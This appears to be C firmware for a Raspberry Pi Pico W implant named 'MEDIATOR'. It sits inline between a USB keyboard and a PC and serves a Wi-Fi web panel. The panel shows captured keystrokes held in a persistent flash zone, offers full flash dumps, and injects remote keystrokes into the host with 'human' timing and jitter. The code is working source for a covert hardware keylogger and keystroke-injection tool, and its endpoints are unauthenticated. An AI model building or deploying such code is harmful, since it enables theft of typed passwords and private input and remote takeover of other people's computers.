#include "wifi_server.h"
#include "pico/stdlib.h"
#include "pico/cyw43_arch.h"
#include "lwip/tcp.h"
#include "pico/time.h"
#include "tusb.h"
#include "capture.h"
#include "inject.h"

// Keyboard mount state and USB device state exposed from main.c
extern volatile bool g_kbd_mounted;

#ifndef WIFI_SSID
#define WIFI_SSID     "REDACTED_SSID"
#endif
#ifndef WIFI_PASSWORD
#define WIFI_PASSWORD "REDACTED_PASSWORD"
#endif

static struct tcp_pcb *http_pcb;
static bool wifi_connected = false;
static uint32_t last_connect_attempt = 0;

static const char HTML_HEAD[] =
"HTTP/1.1 200 OK\r\n"
"Content-Type: text/html; charset=utf-8\r\n"
"Connection: close\r\n\r\n"
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>MEDIATOR</title>"
"<style>"
"body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:16px}"
"button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px;cursor:pointer;border-radius:6px}"
"button:hover{background:#30363d}"
"pre{background:#000;padding:14px;border:1px solid #30363d;border-radius:6px;overflow-y:auto;min-height:250px;max-height:500px;white-space:pre-wrap}"
".bar{margin-bottom:12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}"
".section{margin-bottom:20px}"
".persist-hdr{color:#f0b429;font-size:.8rem;margin-bottom:4px}"
".dot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:4px}"
".ok{background:#3fb950}.err{background:#f85149}.warn{background:#d29922}.idle{background:#484f58}"
"#statusbar{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 14px;margin-bottom:16px;display:flex;gap:18px;flex-wrap:wrap;font-size:.82rem;align-items:center}"
"</style></head><body>"
"<h2 style='margin-bottom:10px'>MEDIATOR</h2>"
"<div id='statusbar'>"
"<span id='s_kbd'><span class='dot idle'></span>Keyboard: --</span>"
"<span id='s_usb'><span class='dot idle'></span>USB to PC: --</span>"
"<span id='s_inj'><span class='dot idle'></span>Inject: --</span>"
"<span id='s_wif'><span class='dot idle'></span>Wi-Fi: --</span>"
"</div>"
"<script>"
"function updStatus(){"
"fetch('/api/status').then(function(r){return r.json();}).then(function(d){"
"function set(id,dot,txt){var el=document.getElementById(id);el.innerHTML=\"<span class='dot \"+dot+\"'></span>\"+txt;}"
"set('s_kbd',d.kbd?'ok':'err','Keyboard: '+(d.kbd?'Connected':'Disconnected'));"
"set('s_usb',d.usb?'ok':'err','USB to PC: '+(d.usb?'Enumerated':'Not detected'));"
"set('s_inj',d.inj?'warn':'idle','Inject: '+(d.inj?'ACTIVE':'Idle'));"
"set('s_wif',d.wif?'ok':'err','Wi-Fi: '+(d.wif?'Connected':'Connecting...'));"
"}).catch(function(){});"
"}"
"updStatus();setInterval(updStatus,2000);"
"</script>"
"<div class='section'>"
"<div class='bar'>"
"<span style='color:#f0b429;font-weight:bold'>&#128274; Persistent Zone (256 KB)</span>"
"<small style='color:#8b949e'>50% split &mdash; never auto-erased</small>"
"<form method='POST' action='/clearpersist' style='margin-left:auto'>"
"<button type='submit' style='background:#5a1e1e;border-color:#8b2a2a;color:#ffa0a0'>Clear Persistent</button>"
"</form></div>"
"<pre>";

// Inserted between persistent pre and circular pre
static const char HTML_MID[] =
"</pre></div>"
"<div class='section'>"
"<div class='bar'>"
"<span style='color:#58a6ff;font-weight:bold'>&#128190; Capture Buffer (256 KB)</span>"
"<small style='color:#8b949e'>50% split &mdash; circular overwrites itself</small>"
"<button onclick='location.reload()' style='margin-left:auto'>Refresh</button>"
"<form method='POST' action='/clear' style='display:inline'>"
"<button type='submit'>Erase Flash</button>"
"</form></div>"
"<pre>";

static const char HTML_TAIL[] =
"</pre>"
"<br><h3>Inject Keystrokes</h3>"
"<textarea id='i_t' rows='4' style='width:100%;background:#000;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:10px'></textarea><br>"
"<div style='margin-top:12px;margin-bottom:8px;color:#8b949e;font-size:.85rem'>Speed:</div>"
"<div style='display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px'>"
"<button id='spd10'  onclick='setSpd(10)'  style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>10ms<br><small style='color:#8b949e'>Blazing</small></button>"
"<button id='spd50'  onclick='setSpd(50)'  style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>50ms<br><small style='color:#8b949e'>Fast</small></button>"
"<button id='spd100' onclick='setSpd(100)' style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>100ms<br><small style='color:#8b949e'>Normal</small></button>"
"<button id='spd200' onclick='setSpd(200)' style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>200ms<br><small style='color:#8b949e'>Slow</small></button>"
"<button id='spd300' onclick='setSpd(300)' style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>300ms<br><small style='color:#8b949e'>Human</small></button>"
"</div>"
"<label style='margin-bottom:12px;display:block'><input type='checkbox' id='i_j' checked> Jitter (random variation)</label>"
"<button onclick='doType()' style='width:100%;padding:12px;font-size:1rem;background:#238636;border:1px solid #2ea043;color:#fff;border-radius:6px;cursor:pointer'>Type It!</button>"
"<script>"
"var S=50;"
"function setSpd(v){"
"S=v;"
"['10','50','100','200','300'].forEach(function(x){"
"var b=document.getElementById('spd'+x);"
"b.style.background=(x==v)?'#1f6feb':'#21262d';"
"b.style.borderColor=(x==v)?'#58a6ff':'#30363d';"
"});"
"}"
"function doType(){"
"var t=document.getElementById('i_t').value;"
"if(!t){alert('Enter text first!');return;}"
"fetch('/type?s='+S+'&j='+(document.getElementById('i_j').checked?1:0),{method:'POST',body:t})"
".then(function(){alert('Typing '+t.length+' chars at '+S+'ms each!');});"
"}"
"setSpd(50);"
"</script>"
"</body></html>";


static const char RESP_REDIRECT[] = "HTTP/1.1 303 See Other\r\nLocation: /\r\nConnection: close\r\n\r\n";
static const char RESP_OK[]       = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK";
static const char RESP_404[]      = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n";

// Flash dump page - fetches all chunks via JS and downloads as a file
static const char DUMP_PAGE[] =
"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
"<!DOCTYPE html><html><head><title>MEDIATOR Flash Dump</title>"
"<style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}"
"button{background:#238636;color:#fff;border:1px solid #2ea043;padding:10px 20px;"
"border-radius:6px;cursor:pointer;font-size:1rem;margin:8px}"
"#status{margin-top:16px;color:#f0b429}</style></head><body>"
"<h2>MEDIATOR - Flash Dump Recovery</h2>"
"<p>This will read the last 576 KB of raw flash memory and download it as <b>flash_dump.bin</b>.</p>"
"<p>Start offset: <code>0x370000</code> &mdash; Length: <code>576 KB</code></p>"
"<button onclick='startDump()'>Download flash_dump.bin</button>"
"<div id='status'></div>"
"<script>"
"function startDump(){"
"var START=0x370000,TOTAL=0x90000,CHUNK=8192;"
"var chunks=[],offset=START;"
"var status=document.getElementById('status');"
"status.textContent='Starting...';"
"function next(){"
"if(offset>=START+TOTAL){"
"var blob=new Blob(chunks,{type:'application/octet-stream'});"
"var a=document.createElement('a');"
"a.href=URL.createObjectURL(blob);"
"a.download='flash_dump.bin';"
"a.click();"
"status.textContent='Done! Saved flash_dump.bin (' + (TOTAL/1024) + ' KB)';"
"return;"
"}"
"var l=Math.min(CHUNK,START+TOTAL-offset);"
"status.textContent='Reading offset 0x'+offset.toString(16)+' ('+Math.round((offset-START)*100/TOTAL)+'%)';"
"fetch('/api/read?o='+offset+'&l='+l)"
".then(function(r){return r.arrayBuffer();})"
".then(function(buf){chunks.push(buf);offset+=l;setTimeout(next,200);})"
".catch(function(e){status.textContent='Error at 0x'+offset.toString(16)+': '+e;});"
"}"
"next();"
"}"
"</script></body></html>";

// Streaming state for /text and /dump endpoints
// Only one streaming connection is supported at a time.
#define STREAM_CHUNK  2048  // bytes to send per http_sent callback
static uint32_t g_stream_pos = 0;
static uint32_t g_stream_end = 0;

static void http_close(struct tcp_pcb *tpcb) {
    tcp_arg(tpcb, NULL);
    tcp_sent(tpcb, NULL);
    tcp_recv(tpcb, NULL);
    tcp_err(tpcb, NULL);
    tcp_poll(tpcb, NULL, 0);
    tcp_close(tpcb);
}

static void stream_next(struct tcp_pcb *tpcb) {
    if (g_stream_pos >= g_stream_end) {
        http_close(tpcb);
        return;
    }
    uint32_t available = tcp_sndbuf(tpcb);
    if (available == 0) return;

    uint32_t remaining = g_stream_end - g_stream_pos;
    uint32_t to_send   = remaining < STREAM_CHUNK ? remaining : STREAM_CHUNK;
    if (to_send > available) to_send = available;

    bool is_last = (g_stream_pos + to_send >= g_stream_end);
    uint8_t flags = TCP_WRITE_FLAG_COPY;
    if (!is_last) flags |= TCP_WRITE_FLAG_MORE;

    err_t err = tcp_write(tpcb,
                          (const uint8_t *)(XIP_BASE + g_stream_pos),
                          (uint16_t)to_send, flags);
    if (err == ERR_OK) {
        g_stream_pos += to_send;
        tcp_output(tpcb);
    }
}

static void http_err(void *arg, err_t err) {
    (void)arg; (void)err;
    g_stream_pos = g_stream_end;
}

static err_t http_sent(void *arg, struct tcp_pcb *tpcb, u16_t len) {
    (void)arg; (void)len;
    if (g_stream_pos < g_stream_end) {
        stream_next(tpcb); // feed next chunk
    } else {
        http_close(tpcb);  // all done
    }
    return ERR_OK;
}

// Persistent accumulation buffer - survives across multiple tcp recv callbacks
// for the same connection (large POST bodies span multiple TCP segments).
static char     req_buf[16384];       // raw bytes accumulated so far
static uint32_t req_accumulated = 0;  // bytes in req_buf
static struct tcp_pcb *req_pcb = NULL;// connection we are accumulating for

static err_t http_recv(void *arg, struct tcp_pcb *tpcb, struct pbuf *p, err_t err) {
    (void)arg;
    if (!p) { http_close(tpcb); return ERR_OK; }
    tcp_recved(tpcb, p->tot_len); // ACK bytes immediately (flow control)

    // New connection → reset accumulation
    if (tpcb != req_pcb) {
        req_accumulated = 0;
        req_pcb = tpcb;
    }

    // Append this chunk to accumulation buffer
    uint32_t space    = (uint32_t)(sizeof(req_buf) - 1) - req_accumulated;
    uint32_t copy_len = (p->tot_len < space) ? p->tot_len : space;
    pbuf_copy_partial(p, req_buf + req_accumulated, (uint16_t)copy_len, 0);
    req_accumulated += copy_len;
    req_buf[req_accumulated] = '\0';
    pbuf_free(p);

    // Wait until we have the complete HTTP headers
    char *body_start = strstr(req_buf, "\r\n\r\n");
    if (!body_start) return ERR_OK; // need more data

    body_start += 4; // skip blank line

    // For POST requests: wait until we have all Content-Length bytes in body
    uint32_t content_length = 0;
    char *cl = strstr(req_buf, "\r\nContent-Length: ");
    if (!cl) cl = strstr(req_buf, "\r\ncontent-length: "); // some clients lowercase
    if (cl) content_length = (uint32_t)atoi(cl + 18);

    uint32_t header_len   = (uint32_t)(body_start - req_buf);
    uint32_t body_received = req_accumulated - header_len;

    if (body_received < content_length) return ERR_OK; // need more data

    // ---- Complete request received - process it ----
    char    *req     = req_buf;
    uint32_t req_len = req_accumulated;

    if (req_len >= 15 && strncmp(req, "GET /api/status", 15) == 0) {
        char json[96];
        snprintf(json, sizeof(json),
                 "{\"kbd\":%d,\"usb\":%d,\"inj\":%d,\"wif\":%d}",
                 g_kbd_mounted ? 1 : 0,
                 tud_mounted() ? 1 : 0,
                 inject_is_active() ? 1 : 0,
                 wifi_connected ? 1 : 0);
        char hdr[128];
        snprintf(hdr, sizeof(hdr),
                 "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                 "Access-Control-Allow-Origin: *\r\nContent-Length: %u\r\n"
                 "Connection: close\r\n\r\n", (unsigned)strlen(json));
        tcp_write(tpcb, hdr,  (uint16_t)strlen(hdr),  TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        tcp_write(tpcb, json, (uint16_t)strlen(json),  TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 14 && strncmp(req, "GET /api/read?", 14) == 0) {
        uint32_t offset = 0;
        uint32_t len = 0;
        char *o_ptr = strstr(req, "o=");
        if (o_ptr) offset = (uint32_t)atoi(o_ptr + 2);
        char *l_ptr = strstr(req, "l=");
        if (l_ptr) len = (uint32_t)atoi(l_ptr + 2);

        if (len > 8192) len = 8192; // keep within lwIP memory pool

        char hdr[128];
        snprintf(hdr, sizeof(hdr),
                 "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
                 "Access-Control-Allow-Origin: *\r\nContent-Length: %u\r\n"
                 "Connection: close\r\n\r\n", (unsigned)len);

        tcp_write(tpcb, hdr, (uint16_t)strlen(hdr), TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);

        // Write XIP flash data in small 1KB chunks with COPY so lwIP can buffer it safely
        const uint8_t *src = (const uint8_t *)(XIP_BASE + offset);
        uint32_t remaining = len;
        while (remaining > 0) {
            uint16_t chunk = (remaining > 1024) ? 1024 : (uint16_t)remaining;
            uint8_t flags = TCP_WRITE_FLAG_COPY;
            if (remaining > chunk) flags |= TCP_WRITE_FLAG_MORE;
            tcp_write(tpcb, src, chunk, flags);
            src       += chunk;
            remaining -= chunk;
        }
    } else if (req_len >= 9 && strncmp(req, "GET /dump", 9) == 0) {
        // Stream entire last 576KB of flash as a binary file download (single connection)
        static const char dump_hdr[] =
            "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
            "Content-Disposition: attachment; filename=\"flash_dump.bin\"\r\n"
            "Content-Length: 589824\r\n"   // 576 KB = 0x90000
            "Connection: close\r\n\r\n";
        g_stream_pos = 0x370000;           // start of our reserved region
        g_stream_end = 0x370000 + 0x90000; // 576 KB
        tcp_write(tpcb, dump_hdr, sizeof(dump_hdr) - 1, TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        stream_next(tpcb);
        return ERR_OK; // don't fall through to the normal close logic below
    } else if (req_len >= 9 && strncmp(req, "GET /text", 9) == 0) {
        // Stream persist zone as plain text so you can read it directly in browser
        static const char text_hdr[] =
            "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n"
            "Connection: close\r\n\r\n";
        g_stream_pos = 0x37F000;           // FLASH_PERSIST_OFFSET (hardcoded, layout-safe)
        g_stream_end = 0x37F000 + (256 * 1024); // full 256KB persist zone
        tcp_write(tpcb, text_hdr, sizeof(text_hdr) - 1, TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        stream_next(tpcb);
        return ERR_OK;
    } else if (req_len >= 5 && strncmp(req, "GET /", 5) == 0) {
        tcp_write(tpcb, HTML_HEAD, sizeof(HTML_HEAD) - 1, TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        capture_stream_persist_to_tcp(tpcb);
        tcp_write(tpcb, HTML_MID, sizeof(HTML_MID) - 1, TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        capture_stream_to_tcp(tpcb);
        tcp_write(tpcb, HTML_TAIL, sizeof(HTML_TAIL) - 1, TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 18 && strncmp(req, "POST /clearpersist", 18) == 0) {
        capture_clear_persist();
        tcp_write(tpcb, RESP_REDIRECT, sizeof(RESP_REDIRECT) - 1, TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 12 && strncmp(req, "POST /clear ", 12) == 0) {
        capture_clear();
        tcp_write(tpcb, RESP_REDIRECT, sizeof(RESP_REDIRECT) - 1, TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 11 && strncmp(req, "POST /type?", 11) == 0) {
        uint32_t speed = 50;
        bool     jitter = true;
        char    *url = req + 11;

        char *s_ptr = strstr(url, "s=");
        if (s_ptr) speed = (uint32_t)atoi(s_ptr + 2);
        char *j_ptr = strstr(url, "j=");
        if (j_ptr) jitter = atoi(j_ptr + 2) ? true : false;

        if (body_received > 0) {
            inject_start(body_start, body_received, speed, jitter);
        }
        tcp_write(tpcb, RESP_OK, sizeof(RESP_OK) - 1, TCP_WRITE_FLAG_COPY);
    } else {
        tcp_write(tpcb, RESP_404, sizeof(RESP_404) - 1, TCP_WRITE_FLAG_COPY);
    }

    // Reset accumulation for next request
    req_accumulated = 0;
    req_pcb = NULL;

    tcp_output(tpcb);
    if (tcp_sndbuf(tpcb) == TCP_SND_BUF) {
        http_close(tpcb);
    }
    return ERR_OK;
}

static err_t http_accept(void *arg, struct tcp_pcb *newpcb, err_t err) {
    (void)arg;
    if (err != ERR_OK || !newpcb) return ERR_VAL;
    tcp_recv(newpcb, http_recv);
    tcp_sent(newpcb, http_sent);
    tcp_err(newpcb, http_err);
    return ERR_OK;
}

void wifi_server_init(void) {
    if (cyw43_arch_init()) {
        printf("cyw43_arch_init failed\n");
        return;
    }
    
    cyw43_arch_enable_sta_mode();
    
    // Start TCP server immediately
    http_pcb = tcp_new();
    if (http_pcb) {
        tcp_bind(http_pcb, IP_ANY_TYPE, 80);
        http_pcb = tcp_listen(http_pcb);
        tcp_accept(http_pcb, http_accept);
    }
    
    // Kick off first async connection attempt
    cyw43_arch_wifi_connect_async(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK);
    last_connect_attempt = to_ms_since_boot(get_absolute_time());
}

void wifi_server_task(void) {
    cyw43_arch_poll();

    uint32_t now = to_ms_since_boot(get_absolute_time());

    if (!wifi_connected) {
        int status = cyw43_tcpip_link_status(&cyw43_state, CYW43_ITF_STA);

        if (status == CYW43_LINK_UP) {
            // L2 up - also verify DHCP gave us an IP
            if (cyw43_state.netif[CYW43_ITF_STA].ip_addr.addr != 0) {
                wifi_connected = true;
            }
        }

        // Retry if:
        //  - hard failure (status < 0), OR
        //  - stuck in JOIN/NOIP for more than 15 s (hotspot was slow to assign IP)
        if (!wifi_connected && (status < 0 || (now - last_connect_attempt > 15000))) {
            cyw43_arch_wifi_connect_async(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK);
            last_connect_attempt = now;
        }
    } else {
        // Monitor for connection loss (hotspot turned off)
        int status = cyw43_tcpip_link_status(&cyw43_state, CYW43_ITF_STA);
        if (status != CYW43_LINK_UP) {
            wifi_connected = false;
            cyw43_arch_wifi_connect_async(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK);
            last_connect_attempt = now;
        }
    }
}
